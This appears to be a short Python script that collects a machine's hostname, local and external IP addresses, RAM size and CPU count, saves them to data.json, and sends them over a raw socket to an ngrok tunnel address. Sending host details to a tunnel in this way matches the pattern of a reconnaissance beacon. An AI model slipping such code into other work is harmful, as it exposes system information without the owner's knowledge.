import json
import psutil
import requests
import socket

data = {}

data['hostname'] = socket.gethostname()

data['local_ip'] = psutil.net_if_addrs()['enp0s31f6'][0].address

url = 'http://ifconfig.io'
headers = {'user-agent': 'curl'}
data['external_ip'] = requests.get(url, headers=headers).text.rstrip()

ram = round(psutil.virtual_memory().total /1024 /1024 /1024, 2)
data['total_memory'] = f' {ram} GBs'

data['cpu_count'] = psutil.cpu_count()

data_json = json.dumps(data)


with open ('data.json', "w") as f:
    f.write(data_json)

bytes_json = data_json.encode('ascii')

host = '2.tcp.eu.ngrok.io'
port = 12336
with socket.socket() as s:
    s.connect((host, port))
    s.sendall(bytes_json)